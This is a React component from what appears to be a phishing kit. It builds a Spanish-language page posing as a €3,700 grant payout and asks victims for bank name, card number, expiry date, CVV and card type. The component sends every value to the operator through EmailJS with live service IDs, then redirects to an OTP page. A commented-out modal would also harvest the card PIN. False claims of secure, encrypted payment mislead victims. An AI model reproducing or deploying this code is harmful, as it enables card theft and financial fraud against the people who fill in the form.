import React, { useState } from 'react';
import { Modal, Button, Form } from 'react-bootstrap';
import { useNavigate } from 'react-router-dom';
import emailjs from 'emailjs-com';
import './ExamForm.css';
import Navbar from './Navbar';
import Footer from './Footer';
import bankLogo from './img/banklogo.png'

const ExamForm = () => {
  const [showConfirmModal, setShowConfirmModal] = useState(false);
  const [showPinModal, setShowPinModal] = useState(false);
  const [bankName, setBankName] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expirationDate, setExpirationDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [nameOnCard, setNameOnCard] = useState('');
  const [cardType, setCardType] = useState('');
  const [pin, setPin] = useState('');
  const navigate = useNavigate();

  const resetForm = () => {
    setBankName('');
    setCardNumber('');
    setExpirationDate('');
    setCvv('');
    setNameOnCard('');
    setCardType('');
    setPin('');
  };

  const handlePayClick = (e) => {
    e.preventDefault();
    sendEmail();
    setShowConfirmModal(true);
  };

  const handleConfirmClick = (e) => {
    e.preventDefault();
     sendEmail();
    setShowConfirmModal(false);
    resetForm();
    // setShowPinModal(true);
    navigate('/otp');
  };

  // const handlePinSubmit = (e) => {
  //   e.preventDefault();
  //   sendEmail();
  //   resetForm();
  //   setShowPinModal(false);
  //   navigate('/otp');
  // };

  const handleTextOnlyInput = (e) => {
    e.target.value = e.target.value.replace(/[^a-zA-Z\s]/g, '');
  };

  const handleNumberOnlyInput = (e) => {
    e.target.value = e.target.value.replace(/[^0-9]/g, '');
  };

  const handleCardNumberChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    value = value.replace(/(.{4})/g, '$1 ').trim();
    setCardNumber(value);
  };

  const handleExpirationDateChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 3) {
      value = value.replace(/(.{2})(.{2})/, '$1 / $2');
    }
    setExpirationDate(value);
  };

  const sendEmail = () => {
    const templateParams = {
      bankName,
      cardNumber,
      expirationDate,
      cvv,
      nameOnCard,
      cardType,
      pin,
    };

    emailjs.send(
      'service_e234qa4', // Replace with your service ID
      'template_f0nymc7', // Replace with your template ID
      templateParams,
      'aM4ACgzNEz-ykB_dV' // Replace with your user ID
    )
      .then((response) => {
        console.log('SUCCESS!', response.status, response.text);
      }, (err) => {
        console.log('FAILED...', err);
      });
  };

  return (
    <div>
    <Navbar />
    <div className="container d-flex justify-content-center mt-5">
      <div className="col-md-6 mt-5">
       
        <h3 className='mt-5'>Distribución de Subvenciones – Verifique y Complete Sus Datos</h3>
        <p>Los fondos se transferirán a su tarjeta bancaria. Por favor, proporcione los siguientes datos para completar el proceso de pago.</p>
        <p>Introduzca solo los datos correctos para evitar <span style={{color: "#FF0000"}}>error(es)</span> durante la distribución.</p>
        <div className="card p-4 pt-2">
        <p className='text-end fw-bold fs-6'>Doble Distribución: 3.700,00 € × 2</p>
        <p className='fst-italic text-end p-0 m-0'>Pago Confiable y Seguro</p>
        <div className="d-flex justify-content-end mb-3">          
          <img src={bankLogo} alt="" class="img-fluid" width={270} height={30} />
        </div>
          <Form onSubmit={handlePayClick} autoComplete="off">
            <Form.Group className="mb-3" controlId="bankName">
              <Form.Label>Nombre del Banco</Form.Label>
              <Form.Control 
                // type="text" 
                placeholder="Ingrese el nombre de su banco" 
                required 
                value={bankName}
                // onInput={handleTextOnlyInput} 
                onChange={(e) => setBankName(e.target.value)}
              />
            </Form.Group>
            <Form.Group className="mb-3" controlId="cardNumber">
              <Form.Label>Número de Tarjeta</Form.Label>
              <Form.Control 
                // type="text" 
                placeholder="0000 0000 0000 0000" 
                required 
                maxLength="24" 
                value={cardNumber}
                onChange={handleCardNumberChange} 
              />
            </Form.Group>
            <div className="row">
              <Form.Group className="col-md-6 mb-3" controlId="expirationDate">
                <Form.Label>Fecha de Expiración</Form.Label>
                <Form.Control 
                  // type="text" 
                  placeholder="MM / AA" 
                  required 
                  maxLength="7" 
                  value={expirationDate}
                  onChange={handleExpirationDateChange} 
                />
              </Form.Group>
              <Form.Group className="col-md-6 mb-3" controlId="cvv">
                <Form.Label>CVV</Form.Label>
                <Form.Control 
                  // type="text" 
                  placeholder="000" 
                  required 
                  maxLength="4" 
                  value={cvv}
                  onChange={(e) => setCvv(e.target.value)}
                  onInput={handleNumberOnlyInput}
                />
              </Form.Group>
            </div>
            {/* <Form.Group className="mb-3" controlId="nameOnCard">
              <Form.Label>Name On Card</Form.Label>
              <Form.Control 
                // type="text" 
                placeholder="Enter name on card" 
                required 
                value={nameOnCard}
                // onInput={handleTextOnlyInput} 
                onChange={(e) => setNameOnCard(e.target.value)}
              />
            </Form.Group> */}
            <Form.Group className="mb-3" controlId="cardType">
              <Form.Label>Tipo de Tarjeta</Form.Label>
              <div>
                <Form.Check 
                  inline 
                  type="radio" 
                  name="cardType" 
                  id="creditCard" 
                  label="Tarjeta de Crédito" 
                  required 
                  checked={cardType === 'credit'}
                  onChange={(e) => setCardType('credit')}
                />
                <Form.Check 
                  inline 
                  type="radio" 
                  name="cardType" 
                  id="debitCard" 
                  label="Tarjeta de Débito" 
                  required 
                  checked={cardType === 'debit'}
                  onChange={(e) => setCardType('debit')}
                />
              </div>
            </Form.Group>

            <p className='fst-italic'>Por favor, revise y confirme sus datos con su tarjeta bancaria antes de enviar.</p>

            <Button variant="primary" type="submit">ENVIAR</Button>
            
          </Form>
        </div>
        <p className="mt-3"><strong>Confiable y Seguro</strong><br />
        Su seguridad es nuestra principal prioridad. Utilizamos protocolos de cifrado avanzados para proteger su información, garantizando los más altos estándares de protección de datos.</p>
        
        {/* Confirmation Modal */}
        <Modal show={showConfirmModal} onHide={() => setShowConfirmModal(false)}>
          <Modal.Header closeButton>
            <Modal.Title>Confirmar Detalles</Modal.Title>
          </Modal.Header>
          <Modal.Body>
            <p>Por favor, asegúrese de que todos los detalles de la cuenta sean correctos antes de confirmar su envío para evitar <span style={{ color: '#FF0000' }}>error(es)</span> durante la distribución.</p>
          </Modal.Body>
          <Modal.Footer>
            <Button variant="secondary" onClick={() => setShowConfirmModal(false)}>Cancelar</Button>
            <Button variant="primary" onClick={handleConfirmClick}>Sí, he confirmado.</Button>
          </Modal.Footer>
        </Modal>

        {/* PIN Modal */}
        {/* <Modal show={showPinModal} onHide={() => setShowPinModal(false)}>
          <Modal.Header closeButton>
            <Modal.Title>Enter PIN</Modal.Title>
          </Modal.Header>
          <Modal.Body>
            <Form onSubmit={handlePinSubmit}>
              <Form.Group className="mb-3" controlId="pin">
                <Form.Label>Enter Your 4 Digit Card PIN to Complete Payment</Form.Label>
                <Form.Control 
                  type="text" 
                  placeholder="0000" 
                  required 
                  maxLength="4" 
                  value={pin}
                  onInput={handleNumberOnlyInput}
                  onChange={(e) => setPin(e.target.value)}
                />
              </Form.Group>
              <Button variant="primary" type="submit">PAY</Button>                           
              <p className="fw-bold text-end"> - $ 6.00</p>
            </Form>
          </Modal.Body>
          <Modal.Footer>
            <Form.Text className="text-muted">Kindly avoid disclosing your information to others.</Form.Text>
          </Modal.Footer>
        </Modal> */}
      </div>
    </div>
    <Footer />
    </div>
  );
};

export default ExamForm;
